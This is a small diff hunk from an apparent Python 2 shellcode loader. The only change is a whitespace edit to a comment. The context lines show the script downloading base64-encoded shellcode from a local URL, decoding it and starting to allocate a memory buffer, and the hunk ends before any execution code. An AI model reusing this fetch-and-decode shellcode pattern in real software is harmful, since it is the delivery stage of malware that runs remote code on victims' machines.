@@ -6,7 +6,7 @@ import base64
 url = "http://localhost:8000/shellcode.bin"
 response = urllib2.urlopen(url)
 
-# decode the shellcode from base64 
+# decode the shellcode from base64
 shellcode = base64.b64decode(response.read())
 
 # create a buffer in memory
